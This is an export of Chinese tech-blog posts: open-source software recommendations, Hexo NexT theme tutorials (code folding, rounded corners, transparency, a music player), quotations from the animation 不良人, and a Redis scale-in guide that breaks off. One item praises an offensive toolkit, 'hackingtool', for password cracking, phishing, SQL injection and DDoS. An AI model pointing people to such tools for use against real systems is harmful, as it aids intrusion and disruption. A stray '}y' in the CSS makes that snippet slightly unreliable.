免费的Windows卸载工具，同时在卸载之后会自动清理注册表缓存，也属于我的装机必备软件。\n\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"./OpenSourceSofts/9.png\" />\n</p>\n\n* **[potplayer视频播放器](https://potplayer.daum.net/)**\n\n本人一直在用的视频播放器软件，几乎是装机必备的软件，功能很强大，唯一的缺点是只支持Windows系统。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/10.png\" />\n</p>\n\n* **[VLC视频播放器](https://www.videolan.org/vlc/)**\n\nVLC 是一款免费、自由、开源的跨平台多媒体播放器及框架，可播放大多数多媒体文件，以及各类流媒体协议。可在所有平台运行 - Windows, Linux, Mac OS X, Unix, iOS, Android...   \n本人在Ubuntu上就是用的这个。\n\n<p align=\"center\" style=\"width:50%;\">\n\t<img src=\"./OpenSourceSofts/1.jpg\" />\n</p>\n\n* **[Captura](https://mathewsachin.github.io/blog/2023/04/09/captura-unmaintained.html)**\n\nCaptura是一款适用于 Windows 的屏幕捕获（屏幕截图、录制）应用程序，可以捕获屏幕、网络摄像头、音频和击键。它不再维护，但源代码仍然存档在 GitHub 上，有 8k+ star 和 1.5k+ fork。\n\n<p align=\"center\" style=\"width:30%;\">\n  <img src=\"./OpenSourceSofts/11.png\" />\n</p>\n\n* **[鼠标自动点击器（简单版）](https://github.com/InJeCTrL/ClickRun)** **[鼠标自动点击器（高级版）](https://github.com/taojy123/KeymouseGo)**\n\n可以帮我们自动完成一些机械性重复的工作！\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/3.png\" />\n</div>\n\n* **[server](https://github.com/screego/server/releases/tag/v1.10.0)**\n\n多用户的屏幕分享服务。它可以快速启动一个在线共享屏幕的服务，让用户无需安装任何软件，仅使用浏览器就能分享自己的屏幕画面。项目基于网页实时通信(WebRTC) 实现，由 STUN/TURN 协议完成内网穿透和浏览器端对端的连接，既实用又有源码可以学习。\n\n<p align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/12.png\" />\n</p>\n\n* **[Umi-OCR](https://github.com/hiroi-sora/Umi-OCR)**\n\nOCR图片转文字识别软件，完全离线。截屏/批量导入图片，支持多国语言、合并段落、竖排文字。可排除水印区域，提取干净的文本。基于 PaddleOCR 。基于 PaddleOCR 的 OCR 图片转文字识别软件。完全免费、可离线使用的开源软件，支持截屏识别文字、批量导入图片、横/竖排文字，还可以自动忽略水印区域，适用于 Win10、Win11 操作系统。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/13.png\" />\n</div>\n\n* **[Gopeed](https://gopeed.com/zh-CN)**\n\n一款支持全平台的下载器。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/2.jpg\" />\n</div>\n\n### Windows工作区\n\n* **[视频压缩神器](https://handbrake.fr/)**\n\nHandBrake 是一款由志愿者构建的开源工具，用于将视频从几乎任何格式转换为一系列广泛支持的现代编解码器。转换几乎任何格式的视频，免费和开源多平台（Windows、Mac 和 Linux）。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/3.jpg\" />\n</div>\n\n* **[LogicFlow](https://github.com/didi/LogicFlow/)**\n\n是一款流程图编辑框架，提供了一系列 流程图的交互、编辑所必需的功能和简单灵活的节点自定义、插件等拓展机制，方便我们快速在业务系统内满足类流程图的需求。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/2.gif\" />\n</div>\n\n* **[SpleeterGui](https://github.com/boy1dr/SpleeterGui)**\n\n一款Windows 上的音轨分离工具，它是第三方制作的Spleeter 桌面应用，支持中文在内的多国语言，可以将音乐里的人声和乐器声分离，轻松实现提取音乐中的伴奏。\n\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"./OpenSourceSofts/14.png\" />\n</div>\n\n### Windows娱乐区\n\n* **[lively](https://github.com/rocksdanister/lively)**\n\nWindows 动态桌面壁纸工具。支持 Windows 用户设置多种动画文件为桌面壁纸的工具，不仅安装简单效果炫酷，而且完全免费。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/4.jpg\" />\n</div>\n\n* **[jellyfin](https://github.com/jellyfin/jellyfin)**\n\n这是一款非常优秀的本地媒体库管理工具。完全免费、支持中文、安装简单、跨平台、功能强大的媒体库管理系统。它能把原本躺在文件夹里的视频文件，变成包含封面、描述、评分、演员表等信息的“影碟”，让视频整整齐齐、赏心悦目，还支持视频续播、订阅更新、多端可看，让你可以远离广告优雅地追剧。\n\n* **[calibre](https://github.com/kovidgoyal/calibre)**\n\n一款完全免费开源且功能强大的电子书管理工具。它是集下载、格式转化、制作、管理于一体的电子书工具，比如可以将 txt 文本，转化成包含作者信息和书籍封面的 mobi 文件，制作完成后还可以直接发送到 Kindle 设备上。 支持多种电子书格式，包括EPUB、MOBI、PDF等等。Calibre的功能非常强大，可以帮助用户轻松地管理自己的电子书库，包括添加、删除、重命名和搜索等。此外，它还提供了阅读器功能，用户可以在软件内直接阅读电子书，而不需要另外下载阅读器。你还可以可通过插件/扩展实现更多的功能。\n\n### 极客区\n\n* **[hackingtool](https://github.com/Z4nzu/hackingtool)**\n\n黑客工具全家桶。该项目收录了各种黑客工具，包括破解密码、SQL 注入、钓鱼攻击、XSS、DDos 等。堪称黑客军火库的开源项目啊\n\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"./OpenSourceSofts/15.png\" />\n</div>\n\n* **[Rocket.Chat](https://github.com/RocketChat/Rocket.Chat)**\n\n一款可自由定制的企业级开源通信平台源码。用它来可以搭建一个功能丰富的通信平台，可自托管做为 Slack 的开源替代品。支持创建频道、团队和讨论等多种不同功能的群聊，消息支持图片、文件、视频和语音，拥有包括 Windows、Linux、macOS、Android 和 iOS 在内的多种客户端。 如果你需要搭建一个安全加密，且具有高度私密性的通信平台，那么这款开源项目就非常适合你了。\n\n<div align=\"center\" style=\"width:70%;\">\n  <img src=\"./OpenSourceSofts/1.webp\" />\n</div>\n\n* **[vanblog](https://github.com/Mereithhh/vanblog)**\n\n实用的一站式个人博客系统。一款简洁优雅的博客系统，追求极致响应速度和博客体验。快到极致的响应速度，Lighthouse 接近满分。前后台均为响应式，支持 Docker 一键部署。前台为静态页面并支持增量渲染，按需构建更新页面。拒绝花里胡哨的功能，专注于个人博客场景。\n\n[vanblog快速上手](https://vanblog.mereith.com/guide/get-started.html)\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/16.png\" />\n</div>\n\n* **[HWiNFO ](https://www.hwinfo.com/)**\n\n适用于 Windows 和 DOS 的全面硬件分析、监控和报告。坦白说，是一个计算机硬件监测工具，并且可以生成报告保存、最全面的系统审计工具。受到了NASA、AMD、华硕、因特尔、戴尔、技嘉等厂商的一致认可。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/5.jpg\" />\n</div>\n\n* **[crystaldiskmark](https://crystalmark.info/en/software/crystaldiskmark/)**\n\nCrystalDiskMark 是一款简单的磁盘基准测试软件。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/4.png\" />\n</div>\n\n* **[1Panel](https://github.com/1Panel-dev/1Panel)**\n\n现代化、开源的 Linux 服务器运维管理面板\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/17.png\" />\n</div>\n\n### 安卓应用区\n\n* **[organicmaps](https://github.com/organicmaps/organicmaps)**\n\n一款免费、没广告的离线地图应用。适用于旅行者、游客、徒步旅行者和骑行者的Android 和iOS 离线地图应用，它使用OpenStreetMap 数据，支持详细的离线地图、骑行路线、语音导航、等高线、海拔剖面、山峰和坡度等功能。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/2.png\" />\n</div>\n\n* **[BlackHole](https://github.com/Sangwan5688/BlackHole)**\n\n一款高颜值的音乐播放器应用。该项目是用 Flutter 写的高颜值、无广告、免费音乐播放器，拥有歌词、专辑、艺术家、播放列表、定时关闭等功能，支持 Android、iOS、macOS 系统。\n\n<div align=\"center\" style=\"width:50%;\">\n  <img src=\"./OpenSourceSofts/1.png\" />\n</div>\n\n### 高阶AI区\n\n* **[OpenCat](https://github.com/PetoiCamp/OpenCat)**\n\n开源的四足机器人宠物框架源码，这是一个基于Arduino 和Raspberry Pi 的四足机器人宠物框架，让你可通过C/C++/Python 编程语言操控四足机器人。该公司生产的迷你机器猫，神似玩具版的波士顿机械狗。\n\n* **[Bringing-Old-Photos-Back-to-Life](https://github.com/microsoft/Bringing-Old-Photos-Back-to-Life)**\n\n通过深度学习修复老照片的工具，由微软开源的深度学习项目，可用于修复破损的老照片，修复效果显著。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/6.jpg\" />\n</div>\n\n* **[Final2x](https://github.com/Tohrusky/Final2x/)**\n\n图片放大工具，免费开源，主要是清晰度会提高。\n\n<div align=\"center\" style=\"width:40%;\">\n  <img src=\"./OpenSourceSofts/18.png\" />\n</div>\n\n* **[AnimatedDrawings](https://github.com/facebookresearch/AnimatedDrawings)**\n\n让画作动起来的AI 项目。这是Meta AI 研究院开源的动画库，它能让你的画作动起来。无论是小朋友画的小人，还是高水平的卡通人物，该项目都能让它们跟着你一起做动作。\n\n<div align=\"center\" style=\"width:60%;\">\n  <img src=\"./OpenSourceSofts/1.gif\" />\n</div>\n\n### 不正经项目区\n\n* **[Wai](https://github.com/DukeLuo/wai)**\n\n一款可以预防颈椎病的项目。这是一个通过非正常的方式，展示历史上的今天和这个季节吃什么果蔬的内容，“强迫”你活动脖子从而实现预防颈椎病的目的。","tags":["开源软件"],"categories":["探索"]},{"title":"设置博客折叠代码","url":"/2023/09/09/blog-FoldCode/","content":"\n有些时候经常会遇到博客中很长的代码段，占据半个甚至整个屏幕，此时就非常需要将代码段进行折叠，以此来缓解代码块影响阅读的问题。\n\n配置走起！\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`bodyEnd: source/_data/body-end.njk`注释和`style: source/_data/styles.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\n2. 按照`style`的路径和`bodyEnd`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n* 首先添加`bodyEnd`文件的内容\n\n```js 折叠代码\n<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 11\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>\n```\n\nPS：在代码的第11行，可以按照自己的需要进行设置，当代码超过多少行时，折叠代码的JS生效。\n\n* 然后修改`style`文件内容，在文件的末尾添加：\n\n```yml\n/* 代码块隐藏 */\n.code-hidden {\n    display: none;\n}\n```\n\n* 使用案例\n\n````bash\n```bash 折叠代码\n/* some code */\n```\n````\n\n完成的效果就像添加JS代码的代码块一样。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","tags":["博客美化"],"categories":["博客搭建"]},{"title":"设置博客文章的圆角","url":"/2023/09/09/blog-fillet/","content":"\n同样启发与Win11，Win11最大的特点就是圆角的设计了，不得不说，真的是相比来说比较好看。\n\n那么也把自己的博客配置为圆角的设计吧。\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`variable: source/_data/variables.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\nPS：我这里取消注释的比较多，因为设置的比较多，单独说设置圆角的话，只需要取消注释`variable`即可。\n\n2. 按照`variable`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n```yml\n// 圆角设置\n$border-radius-inner     = 10px 10px 10px 10px;\n$border-radius           = 10px;\n```\n\n值越大，圆角弧度越大，按照个人喜好设置即可。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","tags":["博客美化"],"categories":["博客搭建"]},{"title":"设置博客背景的透明度","url":"/2023/09/09/blog-transparency/","content":"\n之前在[设置博客背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)的过程中，其实已经间接实现过设置博客背景透明度的功能了。   \n因为已经设置了博客背景“小飞棍”的特效，如果再把博客背景设置为透明的话，估计很多人会把持不住，在博客上玩起“小飞棍”吧。所以，就一直没有把博客背景设置为透明。\n\n直到前段时间有位朋友跟我说，如果是透明的，效果可能会更好一些。虽说当时我也跟她说过我的顾虑。但是我也打算尝试一下透明效果，毕竟之前设置的时候真的很美。\n\n闲话少叙，教程开始。\n\n<!-- more -->\n\n### 配置步骤\n\n1. 取消注释\n\n和配置背景图片时的操作差不多，打开`themes\\next\\_config.yml`文件。   \n<kbd>CTRL</kbd>+<kbd>F</kbd>查找关键字“custom_file_path”(如果你使用的是VS-CODE编辑器)。   \n取消`style: source/_data/styles.styl`注释。\n\n```yml 折叠代码\ncustom_file_path:\n  #head: source/_data/head.njk\n  #header: source/_data/header.njk\n  #sidebar: source/_data/sidebar.njk\n  #postMeta: source/_data/post-meta.njk\n  #postBodyEnd: source/_data/post-body-end.njk\n  footer: source/_data/footer.swig\n  bodyEnd: source/_data/body-end.njk\n  variable: source/_data/variables.styl\n  #mixin: source/_data/mixins.styl\n  style: source/_data/styles.styl\n```\n\nPS：我这里取消注释的比较多，因为设置的比较多，单独说设置透明度的话，只需要取消注释`style`即可。\n\n2. 按照`style`的路径添加相应的文件，如果当前不存在此文件的话。如果已经存在的话，添加以下配置。\n\n```yml 折叠代码\n//文章背板的颜色rgb\n.main-inner > .sub-menu, .main-inner > .post-block, .main-inner > .tabs-comment, .main-inner > .comments, .main-inner > .pagination{\n\tbackground: #f5f5f56b;\t\t//此处使用十六进制颜色代码,也可以使用rgba进行调色,实际效果为白色透明色底板,rgba的第四参数即为透明度\n}\n\n//修改主体字体颜色\nbody{\t\t\t\t\n  color: #000;\t\t//纯黑\n}\n\n//标题颜色\n.posts-expand .post-title-link {\n    color: #000;\t\t\t\t//首页文章标题颜色， （默认为灰辨识度不高）\n}\n\n//标题下的日期颜色\n.posts-expand .post-meta-container {\n    color: #880000;\t\t\t\t//此处修改为红色,可自行调用rgb调色\n}\n\n//侧边框的透明度设置\n.sidebar {\n  opacity: 0.7;\n}\n\n//菜单栏的调色\n.header-inner {\t\t\n  background: rgba(255,0,255,0.7);\n}y\n\n//搜索框透明\n.popup {\t\t\n  opacity: 0.7;\n}\n\n//主体背景透明\n.main-inner {\n    background-color: rgba(255, 255, 255, 0);\n    padding: 0px 40px 40px 40px;  //调整组件位置\n}\n```\n\nPS：各项配置说明都标注得很清楚，按照自己的喜好进行设置即可。\n\n### 补充\n\n已经取消注释的文件对应的功能和教程链接。\n\n|文件|功能|\n|:---:|:---:|\n|footer|**[背景\"小飞棍\"](https://nustarain.gitee.io/2023/07/17/FlyLine/)**|\n|bodyEnd|**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|\n|variable|**[设置圆角](https://nustarain.gitee.io/2023/09/09/blog-fillet/)**|\n|style|**[背景图片](https://nustarain.gitee.io/2023/07/17/BGPic/)**、**[博客透明度](https://nustarain.gitee.io/2023/09/09/blog-transparency/)**、**[折叠代码](https://nustarain.gitee.io/2023/09/09/blog-FoldCode/)**|","tags":["博客美化"],"categories":["博客搭建"]},{"title":"不良人的台词有多用心","url":"/2023/09/08/tiangangfu/","content":"\n### 袁天罡对话幼时假李星云\n\n从今日起，你要将他当做镜中的自己。不仅是武功，任何事情，你都要学他所学，仿他所示。\n\n为什么？\n\n因为，你们都是李星云，但也可以都不是。从现在起，谁能复唐，谁便是李唐后裔，谁，便是本帅眼中的天子。\n\n<!-- more -->\n\n### 袁天罡龙泉城下对话李星云\n\n他们便是当年建造此处的不良人？\n\n枯骨罢了，何足挂齿。\n\n这就是一将功成，万骨皆枯......\n\n将？岂可与帝王功业相比？帝王谈笑间，当一言倾天下。\n\n笑谈之间，数不尽的丰功伟绩。但笑谈之中，也是数不尽的白骨皑皑。一句话，会有多少人颠沛流离，又会有多少人魂归无处。只是因为，一个人的，一句话？但这一句话能杀人，是不是也能救人呢？其实我始终明白，龙泉不出，这些可敬的死士便会永不瞑目；大唐不复，他们的牺牲就会毫无价值。我辈身在江湖，亦逢乱世，当勇往直前无所无惧。但我也明白，这世间无不死之人，更无不衰之国。可若是辈出的能人都像你一般，一活百年，抓着已逝之势，不顾已失民心，妄图星火燎原。这天下，会变成什么样子呢？道法自然这四个字，我想世间没有人会比你更清楚它的含义。不是吗？袁天罡，三百年了，再不收手，你就没机会了。\n\n唉......你长大了，终不似当年模样。李星云，可否陪本帅，聊聊。\n\n### 天罡赋其一\n\n天下尽做饵，唯本帅执杆。三百年光阴，京师长安到东都洛阳兴亡起伏，从鼓动杨广大兴师旅到造就贞观之治，渭水之盟到大败突厥、废王立武到二圣临朝，谋天宝之乱到纵黄巢造反警示僖宗。\n臣，无不是为大唐，这其中多少苦心，多少苦难，本帅始终不曾停下脚步，却因为你，踌躇了数十年。\n\n三百年，你的每一次成功和失败，都让你很享受吧。\n\n### 沉醉不知归路，佳酿不知甘苦\n\n三百年来，除挚友李淳风，本帅不屑与任何人饮酒，但今日的你，勉强有资格与本帅平坐。本帅以此尘封三十年的佳酿，敬年轻的殿下。 如何？\n\n尚可。\n\n可惜本帅永不能知道这其中滋味了。\n\n不知也罢，苦。\n\n哈哈哈哈。哪怕是苦也好啊。\n\n### 把酒话桑麻\n\n三百年来，此世间，唯本帅一人知你，本帅也唯知你一人。你身在本帅所布之局，一路走来，虽已深谙事理洞悉时局，但你最终仍不会称帝。对吗？但你心知不遂本帅心愿，本帅定不罢休。且你清楚，就算集众人之力，也无法除掉本帅，所以单独与我进入地宫，是想等待一个变数。让本帅永远留下，对吗？而今你又多了一个原因，便是为你那死去的无名兄长，报仇。\n\n你还真是，很了解我呢！\n\n数十年，本帅眼中只有你一人，怎能不了解？\n\n### 天罡赋其二\n数十年艰辛，本帅为的并不是殿下能称帝。皇帝之名，只是个幌子罢了。乱世数十载，以至当下之势。一直以来，本帅才是那个执棋者，本帅才是那个造局人。但今日，本帅死，殿下就会知道，什么才叫真正的，天！下！大！乱！\n\n这世间，最不缺的便是狼子野心者。前有朱贼父子篡权，中有沙陀李鸦儿，岐地宋文通野心博大，现有门外诸侯权贵，暗流汹涌，尤其那李嗣源，更甚。\n\n对本帅的恐惧，是世人心中最后的枷锁。而你，便是那个开锁之人。此锁一开，天下便再无忌惮。那时，才是真正的尸山血海。而那些本不该死的人，可都是因为你而死啊。\n\n殿下，这盘棋，臣已为您开局，现在该换你来执了。四夷宾服，万邦来朝。可惜本帅，等不到您登基那天，今日就当提前行礼。\n\n高祖，太宗，高宗，玄宗，代，德，顺，武，宣，懿，僖，昭，诸君。\n\n臣！尽力了！\n\n### 恭送大帅\n\n{% dplayer \n  \"url=https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\" \n  \"screenshot\" \n  \"loop=false\" \n  \"preload=auto\"\n  \"volume=0.4\"\n  \"id=46190A32F63DFF2CF0A3BB0F3293636C\" \n  \"api=https://api.prprpr.me/dplayer/\" \n  \"addition=https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\" \n%}","tags":["不良人"],"categories":["娱乐"]},{"title":"在博客中添加音乐播放器","url":"/2023/09/07/hexo-music/","content":"\n突然的心血来潮想尝试在博客中也可以播放音乐，因为之前也见过大佬的博客有这样的功能，今天抽空研究了一下，没想到竟然成功了，赶紧记录下来。\n\n### 环境准备\n\n1. 安装插件\n\n```bash\nnpm install hexo-tag-aplayer --save\n```\n\n<!-- more -->\n\n要实现博客中添加音乐播放器的方式有两种，第一种配置简单，但是使用麻烦，所以不推荐，第二种配置麻烦，使用简单，所以比较推荐。\n\n### 不推荐使用的方式\n\n1. 安装完成后就可以在markdown页面编辑音乐代码了。\n\n```bash\n{% aplayer 断点 张敬轩 https://music.163.com/song/media/outer/url?id=189323.mp3  %}\n```\n\n上面的案例基本按照这样的代码格式进行编写：\n\n```bash\n{% aplayer title author url [picture_url, narrow, autoplay, width:xxx, lrc:xxx] %}\n```\n\n详细参数如下：\n\n|参数|说明|\n|:---:|:---:|\n|title|歌曲标题|\n|author|歌曲作者|\n|url|音乐文件URL地址|\n|picture_url|（可选）封面图片地址|\n|narrow|（可选）播放器袖珍风格|\n|autoplay|（可选）自动播放，移动端浏览器暂时不支持此功能|\n|width|（可选）播放器宽度 (默认: 100%)|\n|lrc|（可选）歌词文件 URL 地址|\n\n单曲样例：\n\n```bash\n{% aplayer \n\"光るなら\" \n\"Goose house\" \n\"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3\" \n\"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg\" \n\"lrc:https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc\" \n\"width:100%\" \n%}\n```\n\n效果如图：\n\n![单曲效果图](./hexo-music/1.png)\n\n除了可以添加一首歌曲，还以编辑歌单，代码如下：\n\n```bash 折叠代码\n{% aplayerlist %}\n{\n    \"narrow\": false,\n    \"autoplay\": false,\n    \"mode\": \"random\",//（可选）'random', 'single' (单曲播放), 'circulation' (循环播放), 'order' (列表播放)， 默认：'circulation' \n    \"showlrc\": 3,\n    \"mutex\": true,\n    \"theme\": \"#e6d0b2\",\n    \"preload\": \"metadata\",\n    \"listmaxheight\": \"513px\",\n    \"music\": [\n        {\n            \"title\": \"前前前世\",\n            \"author\": \"RADWIMPS\",\n            \"url\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.mp3\",\n            \"pic\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.jpg\",\n            \"lrc\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/yourname.lrc\"\n        },\n        {\n            \"title\": \"光るなら\",\n            \"author\": \"Goose house\",\n            \"url\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.mp3\",\n            \"pic\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.jpg\",\n            \"lrc\": \"https://cn-south-17-aplayer-46154810.oss.dogecdn.com/hikarunara.lrc\"\n        }\n    ]\n}\n{% endaplayerlist %}\n```\n\n![歌单效果图](./hexo-music/2.png)\n\n歌曲文件，歌曲封面都可以引用本地文件，但是因为音乐，封面，歌词文件都需要自己进行查找，并且还需要借助CDN进行外链生成，很麻烦，所以不建议使用这种方式。\n\n### 推荐使用的方式，引入MetingJS支持\n\n> MetingJS是基于Meting API的APlayer衍生播放器\n\n通过引入MetingJS，播放器将支持QQ音乐、网易云音乐、虾米、酷狗、百度等平台的音乐播放。这种方式比较方便添加在线音乐播放列表。\n\n1. 引入需要在Hexo的配置文件_config.yml中设置。\n\n```bash\naplayer:\n  meting: true # MetingJS 支持\n```\n\n2. 在任意一个Markdown文件里使用 形如以下代码即可使用播放音乐\n\n```bash\n{% meting \"2410869513\" \"netease\" \"playlist\" %}\n```\n\n上面的案例基本按照这样的代码格式进行编写：\n\n```bash\n{% meting \"60198\" \"netease\" \"playlist\" \"autoplay\" \"mutex:false\" \"listmaxheight:340px\" \"preload:none\" \"theme:#ad7a86\" %}\n```\n\n|参数|默认|说明|\n|:---:|:---:|:---:|\n|id|必须值|歌曲 id、播放列表 id、相册 id、搜索关键字|\n|server|必须值|音乐平台: netease, tencent, kugou, xiami, baidu|\n|type|必须值|song, playlist, album, search, artist|\n|fixed|false|开启固定模式|\n|mini|false|开启迷你模式|\n|loop|all|列表循环模式：all, one,none|\n|order|list|列表播放模式： list, random|\n|volume|0.7|播放器音量|\n|lrctype|0|歌词格式类型|\n|listfolded|false|指定音乐播放列表是否折叠|\n|storagename|metingjs|LocalStorage 中存储播放器设定的键名|\n|autoplay|true|自动播放，移动端浏览器暂时不支持此功能|\n|mutex|true|该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停|\n|listmaxheight|340px|播放列表的最大高度|\n|preload|auto|音乐文件预载入模式，可选项： none, metadata, auto|\n|theme|#ad7a86|播放器风格色彩设置|\n\n### 设置播放器吸底模式\n\n可以将播放器缩小在左下角，也称作“吸底模式”\n如果在文章中将播放器的参数fixed激活，只会固定在文章页面中，要将其放在文章外，即博客的左下角，需要另外修改页面代码。\n打开themes/next/layout/_layout.njk文件，在body标签里面的最后处加入aplyer的实例html代码。\n\n```bash 折叠代码\n<div class=\"aplayer\" \n  data-id=\"387465322\" \n  data-server=\"netease\" \n  data-type=\"playlist\" \n  data-fixed=\"true\" \n  data-autoplay=\"false\" \n  data-order=\"list\" \n  data-volume=\"0.5\" \n  data-theme=\"#1da496\" \n  data-preload=\"auto\" >\n</div>\n```\n\n在footer或者header引入依赖文件Aplayer.js和Meting.js，metingjs依赖aplayerjs，所以请注意顺序。\n\n```bash\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css\">\n<script src=\"https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js\"></script>\n<script src=\"https://cdn.jsdelivr.net/npm/meting@1.2.0/dist/Meting.min.js\"></script>\n```\n\n因为在主题文件中手动加入了依赖文件，所以可以在hexo配置文件中关闭插件的自动脚本插入功能：\n\n```bash\naplayer:\n  meting: true\n  asset_inject: false # 关闭自动脚本插入\n```\n\n![吸底效果图](./hexo-music/3.png)\n\n### 引入pjax实现全局播放\n\n当进入其他页面时，吸底播放器会被打断。要实现音乐的不间断播放，也就是全局音乐效果，可以使用pjax。Next主题已经自带了MoOx/pjax，可手动开启。\n\n在主题设置文件_config.yml中将pjax设置为true。","tags":["博客美化"],"categories":["博客搭建"]},{"title":"Redis缩容案例","url":"/2023/08/14/RedisDel/","content":"\n### 操作步骤\n\n要实现Redis缩容，例如移除6387的主机，首先需要把6388的Slave主机移除，然后归还槽位，最后再移除Master主机。\n\n1. 首先查看集群信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n<!-- more -->\n\n效果：\n\n```bash 